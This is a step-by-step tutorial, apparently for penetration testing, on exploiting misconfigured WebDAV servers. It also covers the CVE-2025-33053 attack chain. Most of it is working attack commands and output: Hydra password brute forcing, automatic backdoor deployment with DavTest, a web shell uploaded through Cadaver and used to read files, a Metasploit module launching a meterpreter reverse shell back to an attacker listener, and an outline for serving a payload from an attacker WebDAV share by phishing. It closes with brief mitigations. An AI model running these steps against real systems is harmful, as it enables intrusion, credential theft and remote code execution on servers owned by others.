## Exploiting WebDAV: A Technical Guide Using DavTest and Cadaver

Web Distributed Authoring and Versioning (WebDAV) extends the HTTP protocol to enable collaborative file management on web servers. When misconfigured, WebDAV presents a critical attack vector that has been exploited in real-world espionage campaigns, including the recent CVE-2025-33053 zero-day used by the nation-state actor Stealth Falcon (also known as FruityArmor) against defense organizations in Turkey. This guide provides a technical methodology for auditing WebDAV security using DavTest and Cadaver, based on established penetration testing practices.

### Understanding the Attack Surface

WebDAV servers expose HTTP methods beyond the standard GET and POST, including PUT (file upload), MKCOL (directory creation), MOVE (rename/move), and DELETE. If misconfigured with write permissions and script execution enabled, attackers can upload and execute malicious code on the web server. The most dangerous configuration occurs when a WebDAV directory allows both write access and script execution, effectively turning the server into a remote code execution platform.

In June 2025, Microsoft patched CVE-2025-33053, a WebDAV remote code execution vulnerability that had been exploited in the wild. The attack chain involved a specially crafted .url file that manipulated the working directory parameter to point to an attacker-controlled WebDAV server, causing Windows to load and execute arbitrary binaries from the remote location.

### Tool Overview

**DavTest** is a Perl-based tool developed by Chris Sullo that systematically tests WebDAV servers for file upload vulnerabilities. It performs the following operations:
- Creates a unique test directory using MKCOL
- Uploads test files with various extensions (PHP, ASP, JSP, Perl, etc.) using PUT
- Optionally uploads files as .txt then moves them to executable extensions using MOVE
- Determines which file types actually execute on the server
- Automatically deploys backdoor files for successful extensions

**Cadaver** is a command-line WebDAV client that supports the full WebDAV specification, allowing manual interaction with the server similar to a UNIX FTP client.

### Basic Commands

The following commands represent the initial reconnaissance and testing methodology:

```
davtest -cleanup -url http://target
cadaver http://target
```

### Complete Exploitation Methodology

#### Step 1: Service Enumeration and WebDAV Detection

Begin by scanning the target to identify WebDAV-enabled directories and authentication requirements.

```
nmap -p 80 --script http-enum,http-webdav-scan <target>
```

The http-webdav-scan script specifically identifies WebDAV-enabled directories and methods. For deeper analysis, use:

```
nmap -p 80 --script http-methods --script-args http-methods.url-path=/webdav <target>
```

#### Step 2: Authentication Bypass or Credential Acquisition

WebDAV servers frequently implement Basic or Digest authentication. In a 2025 Capture The Flag exercise documented by security researcher Daryl Brooks, the WebDAV directory required valid credentials. The researcher employed Hydra for brute force authentication testing:

```
hydra -l bob -P /usr/share/wordlists/rockyou.txt <target> http-get /webdav
```

For cases where credentials are obtained through other means, DavTest accepts the -auth parameter:

```
davtest -url http://target/webdav -auth bob:password_123321
```

#### Step 3: Testing File Upload Capabilities with DavTest

DavTest systematically identifies which file types can be uploaded and executed. The tool creates a randomized test directory to avoid interfering with existing content.

**Basic test without cleanup (preserves artifacts for manual inspection):**
```
davtest -url http://target/webdav -auth user:pass
```

**Test with MOVE technique (upload as .txt then rename to executable):**
```
davtest -url http://target/webdav -auth user:pass -move
```

**Automated backdoor deployment for successful extensions:**
```
davtest -url http://target/webdav -auth user:pass -sendbd auto
```

The output reveals which extensions successfully execute. Typical output resembles:

```
Testing DAV connection
Created directory: DavTestDir_RandomString

Sending test files:
.asp -> SUCCESS (executable)
.aspx -> SUCCESS (executable)
.php -> SUCCESS (executable)
.jsp -> FAIL
.html -> SUCCESS (not executable)
.txt -> SUCCESS (not executable)
```

In a real penetration test against an IIS server documented in 2024, the tester discovered that .asp, .aspx, and .txt files uploaded successfully, but only .asp and .aspx executed on the server.

#### Step 4: Manual Web Shell Deployment with Cadaver

Once DavTest confirms executable file types, connect with Cadaver for manual shell deployment.

**Connect to the WebDAV server:**
```
cadaver http://target/webdav
```

**Navigate to the test directory:**
```
dav:/webdav/> ls
dav:/webdav/> cd DavTestDir_RandomString
```

**Upload a web shell:**
```
dav:/webdav/DavTestDir_RandomString/> put /usr/share/webshells/asp/webshell.asp
Uploading webshell.asp to `/webdav/DavTestDir_RandomString/webshell.asp`:
Progress: [=============================>] 100.0% of 2048 bytes succeeded.
```

**Verify upload:**
```
dav:/webdav/DavTestDir_RandomString/> ls
Listing collection `/webdav/DavTestDir_RandomString/`:
webshell.asp            2048  May 15 10:23
```

#### Step 5: Web Shell Execution and Post-Exploitation

Access the uploaded shell through a web browser to execute system commands.

**URL format:**
```
http://target/webdav/DavTestDir_RandomString/webshell.asp
```

**Authentication (if required):**
When accessing via browser, provide the WebDAV credentials. In the documented lab exercise, the tester authenticated as bob:password_123321 and executed the following commands through the ASP shell:

```
dir C:\
type C:\flag.txt
```

The shell executed with IUSR (Internet Guest Account) privileges, which typically has limited but useful permissions for information gathering.

#### Step 6: Advanced Exploitation with Metasploit

For more sophisticated compromise, the Metasploit framework includes a dedicated WebDAV upload module that handles ASP payloads and meterpreter sessions.

```
msf6 > use exploit/windows/iis/iis_webdav_upload_asp
msf6 exploit(iis_webdav_upload_asp) > set payload windows/meterpreter/reverse_tcp
msf6 exploit(iis_webdav_upload_asp) > set RHOST 172.16.176.54
msf6 exploit(iis_webdav_upload_asp) > set LHOST 172.16.176.56
msf6 exploit(iis_webdav_upload_asp) > set PATH /webdav/test.asp
msf6 exploit(iis_webdav_upload_asp) > exploit
```

The module performs the following sequence automatically:
1. Uploads a .txt file containing the payload
2. Issues a MOVE request to rename the file with an .asp extension
3. Requests the file to trigger execution
4. Establishes a meterpreter session

### Real-World Exploit: CVE-2025-33053

In June 2025, Check Point researchers documented active exploitation of CVE-2025-33053 by the Stealth Falcon threat actor. The attack targeted a Turkish defense company and employed a sophisticated chain leveraging WebDAV:

**Attack chain:**
1. Victim received a phishing email containing a malicious .url file as an archive attachment
2. The .url file exploited the WebDAV working directory vulnerability
3. iediagcmd.exe (a legitimate Internet Explorer diagnostic utility) was invoked
4. The working directory parameter pointed to an attacker-controlled WebDAV server
5. route.exe was loaded from the remote WebDAV share and executed
6. The payload deployed Horus Agent, a custom C++ backdoor for the Mythic C2 framework

**Proof of concept setup (disclosed after patch):**
```
# On attacker machine (Linux):
sudo bash webdav_setup.sh  # Configures Apache2 WebDAV server

# Place shellcode loader named route.exe in WebDAV share
# Modify .url file to point to attacker's WebDAV server
# Serve .url file to target via phishing
```

The vulnerability was patched in Microsoft's June 2025 security update, and CISA added it to the Known Exploited Vulnerabilities catalog with a remediation deadline of July 1, 2025.

### Cleanup Procedures

The -cleanup flag in DavTest removes all test artifacts except backdoor files. For manual cleanup with Cadaver:

```
dav:/webdav/DavTestDir_RandomString/> delete webshell.asp
dav:/webdav/> delete DavTestDir_RandomString
```

### Detection and Mitigation

Organizations should implement the following controls to prevent WebDAV exploitation:
- Disable WebDAV on IIS servers where not explicitly required
- Configure authentication for all WebDAV directories
- Restrict write permissions to authenticated users only
- Disable script execution in WebDAV-enabled directories
- Monitor for MKCOL, PUT, and MOVE requests in web server logs
- Apply security patches, particularly CVE-2025-33053 for Windows systems

The documented exploitation techniques have been successfully used in penetration tests and real attacks against misconfigured IIS servers, making WebDAV security assessment a critical component of web application testing.
